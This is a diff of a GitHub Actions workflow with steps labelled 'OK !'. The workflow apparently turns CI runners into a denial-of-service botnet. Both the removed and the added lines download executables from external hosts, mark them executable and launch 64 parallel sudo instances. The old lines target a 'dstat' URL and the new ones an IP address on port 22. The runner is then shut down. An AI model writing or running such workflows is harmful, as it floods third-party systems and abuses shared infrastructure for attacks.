@@ -13,14 +13,11 @@ jobs:
     steps:
       - name: OK !
         run: |
-          pip install git+https://github.com/QuantumLLC/Archer
-          wget https://curl.by/Z5ozX/Test.py -O Test.py
-          wget https://curl.by/PGei9/raww.js -O raww.js
-          chmod +x Test.py
-          chmod +x raww.js
+          wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O tekpoyraz
+          chmod +x tekpoyraz
           PIDS=()
           for i in {1..64}; do
-            sudo timeout 30 python3 Test.py https://dstatlove.xyz/hit && node raww.js https://dstatlove.xyz/hit 30 &
+            sudo timeout 20 ./tekpoyraz 216.202.200.164 22 &
             PIDS+=($!)
           done
           
@@ -30,7 +27,7 @@ jobs:
 
       - name: OK !
         run: |
-          sleep 30
+          sleep 20
           sudo shutdown now
           sudo reboot
           exit 0
